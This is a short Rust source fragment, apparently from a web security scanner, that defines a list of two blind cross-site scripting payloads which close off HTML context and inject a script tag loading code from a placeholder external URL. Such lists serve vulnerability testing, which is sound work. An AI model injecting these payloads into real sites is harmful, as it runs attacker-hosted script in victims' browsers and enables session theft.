pub const XSS_BLIND_PAYLOADS: &[&str] = &[
    "\"'><script src={}></script>",
    "-->\"'></script><script src={}></script>",
];
